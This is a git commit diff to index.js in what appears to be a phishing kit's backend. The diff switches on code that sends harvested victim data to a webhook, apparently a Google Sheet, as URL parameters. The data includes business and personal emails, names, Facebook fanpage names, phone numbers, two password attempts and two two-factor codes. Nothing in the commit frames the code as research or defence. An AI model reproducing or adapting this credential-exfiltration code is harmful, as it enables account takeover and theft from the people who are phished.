acea492796042a02d746c045a84f679df5ad4837
acb14092003 <161220692+acb14092003@users.noreply.github.com>
2024-08-27 20:09:42 +0700

    update

--- index.js
+++ index.js
@@ -52,39 +52,29 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
 
 
 
-    // bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });
-
-
     // ADD GOOGLE SHEET
-    // const url = new URL(process.env.WEBHOOK_URL);
+    const url = new URL(process.env.WEBHOOK_URL);
 
-    // url.searchParams.append('Ip', data.ip ? data.ip : '');
-    // url.searchParams.append('City', data.city ? data.city : '');
-    // url.searchParams.append('Country', data.country ? data.country : '');
-    // url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
-    // url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
-    // url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
-    // url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
-    // url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
-    // // 
-    // url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
-    // url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
-    // // 
-    // url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
-    // url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
+    url.searchParams.append('Ip', data.ip ? data.ip : '');
+    url.searchParams.append('City', data.city ? data.city : '');
+    url.searchParams.append('Country', data.country ? data.country : '');
+    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
+    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
+    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
+    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
+    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
+    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
+    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
+    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
+    url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
 
-    // axios.get(url)
-    // .then(response => {
-    //     const data = response.data;
-    //     if (data.status === 'success') {
-    //         bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-    //     } else {
-    //         bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-    //     }
-    // })
-    // .catch(error => {
-    //     bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
-    // });
+    axios.get(url)
+    .then(response => {
+        
+    })
+    .catch(error => {
+        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+    });
 
 });
 
